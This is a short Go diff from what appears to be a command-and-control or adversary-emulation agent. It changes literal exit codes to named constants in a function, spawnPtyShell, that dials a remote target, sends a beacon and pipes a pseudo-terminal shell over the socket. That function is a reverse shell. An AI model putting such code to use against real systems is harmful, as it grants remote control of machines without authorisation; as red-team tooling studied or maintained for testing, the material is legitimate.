@@ -14,12 +14,12 @@ import (
 func spawnPtyShell(target, executor string, agent *util.AgentConfig) (int, int, error) {
 	conn, err := net.Dial("tcp", target)
 	if err != nil {
-		return agent.Pid, 1, err
+		return agent.Pid, util.ErrorExitStatus, err
 	}
 
 	header, err := agent.BuildSocketBeacon("pty")
 	if err != nil {
-		return agent.Pid, 1, err
+		return agent.Pid, util.ErrorExitStatus, err
 	}
 
 	ctx, cancel := context.WithCancel(context.Background())
@@ -31,5 +31,5 @@ func spawnPtyShell(target, executor string, agent *util.AgentConfig) (int, int, 
 		go io.Copy(ptmx, conn)
 		io.Copy(conn, ptmx)
 	}()
-	return ptyShell.Process.Pid, 0, nil
+	return ptyShell.Process.Pid, util.SuccessExitStatus, nil
 }
